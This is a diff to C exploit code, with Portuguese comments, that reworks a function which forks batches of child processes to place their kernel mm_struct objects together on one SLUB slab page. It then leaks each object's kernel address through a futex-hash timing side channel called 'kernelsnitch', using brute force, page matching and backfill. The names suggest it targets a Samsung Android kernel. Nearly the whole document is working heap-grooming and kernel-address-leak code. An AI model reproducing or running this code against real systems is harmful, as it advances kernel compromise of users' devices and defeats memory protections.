@@ -1186,99 +1186,160 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
 /*
  * batch_controlled_mm_group - Fork em lote para preencher uma pagina slab.
  *
- * Em vez de fork-um-scan-um (que espalha mm_structs por muitas paginas),
- * faz fork de muitos filhos rapidamente no mesmo CPU. O SLUB serve do
- * freelist per-CPU, entao forks consecutivos rapidos caem na mesma pagina.
- * Depois escaneia cada filho para encontrar o endereco mm_struct e
- * preencher todos os 34 slots.
+ * Fork de muitos filhos rapidamente no mesmo CPU para co-localizacao SLUB.
+ * Filhos sao leves (spin-wait, sem estado kernelsnitch).
+ * Pai sinaliza filhos um por um; cada filho cria/usa/libera estado on-demand.
+ * So UM estado kernelsnitch existe por vez -> zero risco de OOM.
  *
  * Retorna 0 em sucesso (base_out e chosen_fds preenchidos), -1 em falha.
  */
+struct batch_child_info {
+  volatile int go;              /* parent -> child: comeca */
+  volatile int done;            /* child -> parent: terminou */
+  volatile int status;          /* 0=found, 1=no_collisions, 2=not_found, 3=setup_fail */
+  volatile uintptr_t mm_addr;   /* child -> parent: endereco mm_struct */
+  volatile uintptr_t page_hint; /* parent -> child: base da pagina conhecida */
+  volatile int use_fast;        /* parent -> child: 1=perfil rapido */
+};
+
 static int batch_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
                                       int *chosen_fds) {
   const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
   const size_t fcount = S918_BATCH_FORK_COUNT;
   size_t i;
 
-  /* Blocos de controle compartilhados parent<->child */
-  volatile int *ctl_go   = mmap(NULL, fcount * sizeof(int),
-      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
-  volatile int *ctl_done = mmap(NULL, fcount * sizeof(int),
-      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
-  volatile int *ctl_res  = mmap(NULL, fcount * sizeof(int),
+  /* Blocos de controle compartilhados parent<->child (MAP_SHARED!) */
+  struct batch_child_info *cinfo = mmap(NULL,
+      fcount * sizeof(struct batch_child_info),
       PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
   pid_t *bpids = mmap(NULL, fcount * sizeof(pid_t),
-      PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
   int *bmfds = mmap(NULL, fcount * sizeof(int),
       PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-  struct kernelsnitch_shared_state **bsts = mmap(NULL, fcount * sizeof(void*),
-      PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
 
-  if (ctl_go == MAP_FAILED || ctl_done == MAP_FAILED || ctl_res == MAP_FAILED ||
-      bpids == MAP_FAILED || bmfds == MAP_FAILED || bsts == MAP_FAILED) {
+  if (cinfo == MAP_FAILED || bpids == MAP_FAILED || bmfds == MAP_FAILED) {
     pr_info("batch: mmap failed\n");
-    if (ctl_go   != MAP_FAILED) munmap((void*)ctl_go,   fcount*sizeof(int));
-    if (ctl_done != MAP_FAILED) munmap((void*)ctl_done,  fcount*sizeof(int));
-    if (ctl_res  != MAP_FAILED) munmap((void*)ctl_res,   fcount*sizeof(int));
-    if (bpids    != MAP_FAILED) munmap(bpids,            fcount*sizeof(pid_t));
-    if (bmfds    != MAP_FAILED) munmap(bmfds,            fcount*sizeof(int));
-    if (bsts     != MAP_FAILED) munmap(bsts,             fcount*sizeof(void*));
+    if (cinfo != MAP_FAILED) munmap(cinfo, fcount * sizeof(struct batch_child_info));
+    if (bpids != MAP_FAILED) munmap(bpids, fcount * sizeof(pid_t));
+    if (bmfds != MAP_FAILED) munmap(bmfds, fcount * sizeof(int));
     return -1;
   }
 
   int ret = -1;
 
   for (int round = 0; round < S918_BATCH_ROUNDS && ret != 0; round++) {
-    size_t nst = 0, forked = 0;
+    size_t forked = 0;
     uintptr_t page_base = 0;
     size_t page_count = 0;
     int slot_fd[64];
     int slot_seen[64];
-    int waited;
+    pid_t drain_pids_arr[256];
+    size_t n_drained = 0;
 
-    memset((void*)ctl_go,   0, fcount * sizeof(int));
-    memset((void*)ctl_done,  0, fcount * sizeof(int));
-    memset((void*)ctl_res,   0, fcount * sizeof(int));
+    memset(cinfo, 0, fcount * sizeof(struct batch_child_info));
     for (i = 0; i < 64; i++) { slot_fd[i] = -1; slot_seen[i] = 0; }
-    for (i = 0; i < fcount; i++) { bpids[i] = 0; bmfds[i] = -1; bsts[i] = NULL; }
+    for (i = 0; i < fcount; i++) { bpids[i] = 0; bmfds[i] = -1; }
 
     pr_info("batch: === round=%d/%d ===\n", round+1, S918_BATCH_ROUNDS);
 
-    /* ---- Fase 1: criar kernelsnitch states ---- */
-    for (i = 0; i < fcount; i++) {
-      bsts[i] = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count,
-          S918_KSNITCH_FULL_COLLISIONS, KERNELSNITCH_VERBOSE,
-          KERNELSNITCH_MTE_ENABLED);
-      if (!bsts[i]) break;
-      /* Primeiros 3: precisao alta (para bruteforce). Resto: rapido (para match_page) */
-      kernelsnitch_set_profile(bsts[i],
-          (i < 3) ? 256 : S918_BATCH_PROFILE_FAST,
-          REPEAT_MEASUREMENT, AVERAGE);
-      nst++;
-    }
-    pr_info("batch: states=%zu\n", nst);
-    if (nst < batch) {
-      pr_info("batch: not enough states (%zu < %zu)\n", nst, batch);
-      goto batch_round_cleanup;
+    /* Pre-drain: fill partial SLUB pages so target forks co-locate */
+    {
+      const size_t drain_cnt = batch * 6;
+      pin_to_core(CORE);
+      for (size_t d = 0; d < drain_cnt && d < 256; d++) {
+        pid_t dp = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
+        if (dp < 0) break;
+        if (dp == 0) {
+          SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+          if (getppid() == 1) _exit(2);
+          pause();
+          _exit(0);
+        }
+        drain_pids_arr[d] = dp;
+        n_drained++;
+      }
+      pr_info("batch: pre-drain %zu on cpu\n", n_drained);
     }
 
-    /* ---- Fase 2: fork rapido no mesmo CPU ---- */
+    /* ---- Fase 1: fork rapido no mesmo CPU (SEM estado kernelsnitch) ---- */
     pin_to_core(CORE);
-    for (i = 0; i < nst; i++) {
+    for (i = 0; i < fcount; i++) {
       pid_t p = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
       if (p < 0) break;
       if (p == 0) {
-        /* ==== Codigo do filho i ==== */
+        /* ==== Codigo do filho ==== */
+        size_t myidx = i;
         SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
         if (getppid() == 1) _exit(2);
-        /* Espera sinal do pai */
-        while (!ctl_go[i]) usleep(50);
-        /* Exercita futex */
-        kernelsnitch_find_collisions(bsts[i]);
-        ctl_res[i] = kernelsnitch_found_collisions(bsts[i]) ? 0 : 4;
+
+        /* Bloqueia ate pai sinalizar (zero overhead, sem poluir timing) */
+        while (!cinfo[myidx].go) {
+          syscall(SYS_futex, (int *)&cinfo[myidx].go,
+                  FUTEX_WAIT, 0, NULL, NULL, 0);
+        }
+        __sync_synchronize(); /* garantir page_hint/use_fast visiveis */
+
+        /* Criar estado kernelsnitch ON-DEMAND (so este filho aloca) */
+        struct kernelsnitch_shared_state *st = kernelsnitch_setup(
+            MM_STRUCT_SZ, MM_ORDER, cpu_count,
+            S918_KSNITCH_FULL_COLLISIONS, KERNELSNITCH_VERBOSE,
+            KERNELSNITCH_MTE_ENABLED);
+        if (!st) {
+          cinfo[myidx].status = 3; /* setup_fail */
+          __sync_synchronize();
+          cinfo[myidx].done = 1;
+          pause();
+          _exit(1);
+        }
+
+        /* Perfil: rapido se page_hint conhecido, senao alta precisao */
+        if (cinfo[myidx].use_fast) {
+          kernelsnitch_set_profile(st,
+              S918_BATCH_PROFILE_FAST, REPEAT_MEASUREMENT, AVERAGE);
+        } else {
+          kernelsnitch_set_profile(st, 256, REPEAT_MEASUREMENT, AVERAGE);
+        }
+
+        /* Encontrar colisoes de hash (timing side-channel) */
+        kernelsnitch_find_collisions(st);
+
+        if (!kernelsnitch_found_collisions(st)) {
+          cinfo[myidx].status = 1; /* no_collisions */
+          st->state = KERNELSNITCH_MM_NOT_FOUND;
+          kernelsnitch_cleanup(st);
+          __sync_synchronize();
+          cinfo[myidx].done = 1;
+          pause();
+          _exit(0);
+        }
+
+        /* Encontrar endereco mm_struct */
+        uintptr_t mm;
+        if (cinfo[myidx].page_hint) {
+          /* Caminho rapido: match contra pagina conhecida */
+          mm = controlled_mm_match_page(st, cinfo[myidx].page_hint);
+          st->state = (mm != (uintptr_t)-1) ?
+              KERNELSNITCH_MM_FOUND : KERNELSNITCH_MM_NOT_FOUND;
+        } else {
+          /* Primeiro hit: bruteforce completo (~5s) */
+          kernelsnitch_bruteforce(st);
+          mm = st->mm_struct;
+        }
+
+        if (mm != (uintptr_t)-1) {
+          cinfo[myidx].status = 0; /* found */
+          cinfo[myidx].mm_addr = mm;
+        } else {
+          cinfo[myidx].status = 2; /* not_found */
+        }
+
+        /* Liberar TODA memoria do estado kernelsnitch */
+        kernelsnitch_cleanup(st);
+
         __sync_synchronize();
-        ctl_done[i] = 1;
-        /* Fica vivo para manter mm_struct alocado */
+        cinfo[myidx].done = 1;
+
+        /* Ficar vivo para manter mm_struct alocado no kernel */
         pause();
         _exit(0);
       }
@@ -1286,53 +1347,57 @@ static int batch_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
       bmfds[i] = open_memfd(p);
       forked++;
     }
-    pr_info("batch: forked=%zu on cpu\n", forked);
+    pr_info("batch: forked=%zu on cpu (no ksnitch states)\n", forked);
     if (forked < batch) {
       pr_info("batch: not enough forks (%zu < %zu)\n", forked, batch);
       goto batch_round_cleanup;
     }
 
-    /* ---- Fase 3: escanear filhos sequencialmente ---- */
+    /* ---- Fase 2: sinalizar e escanear filhos sequencialmente ---- */
+    /* Cada filho cria/usa/libera estado on-demand. So 1 existe por vez. */
     for (i = 0; i < forked && page_count < batch; i++) {
       uintptr_t mm, this_base;
       size_t slot;
+      int waited;
 
-      /* Sinaliza filho para comecar */
-      ctl_go[i] = 1;
+      /* Preparar hints para o filho */
+      if (page_base) {
+        cinfo[i].page_hint = page_base;
+        cinfo[i].use_fast = 1;
+      }
+
+      /* Sinalizar filho para comecar (FUTEX_WAKE acorda instantaneamente) */
       __sync_synchronize();
+      cinfo[i].go = 1;
+      __sync_synchronize();
+      syscall(SYS_futex, (int *)&cinfo[i].go,
+              FUTEX_WAKE, 1, NULL, NULL, 0);
 
-      /* Espera filho terminar (max 15 seg) */
-      for (waited = 0; !ctl_done[i] && waited < 15000; waited++)
+      /* Esperar filho terminar (bruteforce ~5-10s, match_page rapido) */
+      int timeout_ms = page_base ? 15000 : 30000;
+      for (waited = 0; !cinfo[i].done && waited < timeout_ms; waited++)
         usleep(1000);
 
-      if (!ctl_done[i]) {
+      if (!cinfo[i].done) {
         pr_info("batch: child %zu timeout\n", i);
-        bsts[i]->state = KERNELSNITCH_MM_NOT_FOUND;
         continue;
       }
-      if (ctl_res[i] != 0) {
+
+      if (cinfo[i].status == 3) {
+        pr_info("batch: child %zu setup failed\n", i);
+        continue;
+      }
+      if (cinfo[i].status == 1) {
         pr_info("batch: child %zu no collisions\n", i);
-        bsts[i]->state = KERNELSNITCH_MM_NOT_FOUND;
         continue;
       }
-
-      /* Encontrar endereco mm_struct */
-      if (page_base) {
-        /* Caminho rapido: match contra pagina conhecida */
-        mm = controlled_mm_match_page(bsts[i], page_base);
-      } else {
-        /* Primeiro hit: bruteforce completo */
-        kernelsnitch_bruteforce(bsts[i]);
-        mm = bsts[i]->mm_struct;
-      }
-
-      if (mm == (uintptr_t)-1) {
-        bsts[i]->state = KERNELSNITCH_MM_NOT_FOUND;
+      if (cinfo[i].status == 2) {
         pr_info("batch: child %zu mm not found\n", i);
         continue;
       }
-      bsts[i]->found = 1;
-      bsts[i]->state = KERNELSNITCH_MM_FOUND;
+
+      /* status == 0: mm_struct encontrado */
+      mm = cinfo[i].mm_addr;
 
       /* Validar */
       if (!controlled_mm_valid(mm)) {
@@ -1387,6 +1452,44 @@ static int batch_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
               i, (size_t)mm, slot, page_count, batch);
     }
 
+    /* Backfill: test unsignaled children against known NORMAL page */
+    if (page_base && page_count > 0 && page_count < batch) {
+      pr_info("batch: backfill page=%016zx need=%zu\n",
+              (size_t)page_base, batch - page_count);
+      for (i = 0; i < forked && page_count < batch; i++) {
+        if (cinfo[i].done || cinfo[i].go)
+          continue;
+        cinfo[i].page_hint = page_base;
+        cinfo[i].use_fast = 1;
+        __sync_synchronize();
+        cinfo[i].go = 1;
+        __sync_synchronize();
+        syscall(SYS_futex, (int *)&cinfo[i].go,
+                FUTEX_WAKE, 1, NULL, NULL, 0);
+        int waited;
+        for (waited = 0; !cinfo[i].done && waited < 15000; waited++)
+          usleep(1000);
+        if (!cinfo[i].done || cinfo[i].status != 0)
+          continue;
+        uintptr_t mm = cinfo[i].mm_addr;
+        if (!controlled_mm_valid(mm) ||
+            controlled_mm_zone_of(mm) != CONTROLLED_MM_NORMAL)
+          continue;
+        uintptr_t this_base = mm & ~(ORDER3_SIZE - 1);
+        if (this_base != page_base)
+          continue;
+        size_t slot = (mm - this_base) / MM_STRUCT_SZ;
+        if (slot >= batch || slot_seen[slot])
+          continue;
+        slot_seen[slot] = 1;
+        slot_fd[slot] = bmfds[i];
+        bmfds[i] = -1;
+        page_count++;
+        pr_info("batch: backfill child %zu slot=%zu count=%zu/%zu\n",
+                i, slot, page_count, batch);
+      }
+    }
+
     pr_info("batch: round=%d final count=%zu/%zu\n", round+1, page_count, batch);
 
     if (page_count >= batch) {
@@ -1403,10 +1506,7 @@ static int batch_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
     }
 
 batch_round_cleanup:
-    /* Desbloquear todos os filhos e matar */
-    for (i = 0; i < fcount; i++) { ctl_go[i] = 1; }
-    __sync_synchronize();
-    usleep(10000); /* 10ms para filhos despertarem do usleep */
+    /* Matar todos os filhos (SIGKILL termina inclusive spin-wait e pause) */
     for (i = 0; i < forked; i++) {
       if (bpids[i] > 0) {
         kill(bpids[i], SIGKILL);
@@ -1414,24 +1514,18 @@ batch_round_cleanup:
       }
       if (bmfds[i] >= 0) close(bmfds[i]);
     }
-    for (i = 0; i < nst; i++) {
-      if (bsts[i]) {
-        if (bsts[i]->state != KERNELSNITCH_MM_FOUND &&
-            bsts[i]->state != KERNELSNITCH_MM_NOT_FOUND)
-          bsts[i]->state = KERNELSNITCH_MM_NOT_FOUND;
-        kernelsnitch_cleanup(bsts[i]);
-        bsts[i] = NULL;
+    for (size_t d = 0; d < n_drained; d++) {
+      if (drain_pids_arr[d] > 0) {
+        kill(drain_pids_arr[d], SIGKILL);
+        waitpid(drain_pids_arr[d], NULL, 0);
       }
     }
   }
 
   /* Cleanup final das mmaps */
-  munmap((void*)ctl_go,   fcount*sizeof(int));
-  munmap((void*)ctl_done,  fcount*sizeof(int));
-  munmap((void*)ctl_res,   fcount*sizeof(int));
-  munmap(bpids,            fcount*sizeof(pid_t));
-  munmap(bmfds,            fcount*sizeof(int));
-  munmap(bsts,             fcount*sizeof(void*));
+  munmap(cinfo, fcount * sizeof(struct batch_child_info));
+  munmap(bpids, fcount * sizeof(pid_t));
+  munmap(bmfds, fcount * sizeof(int));
   return ret;
 }
 
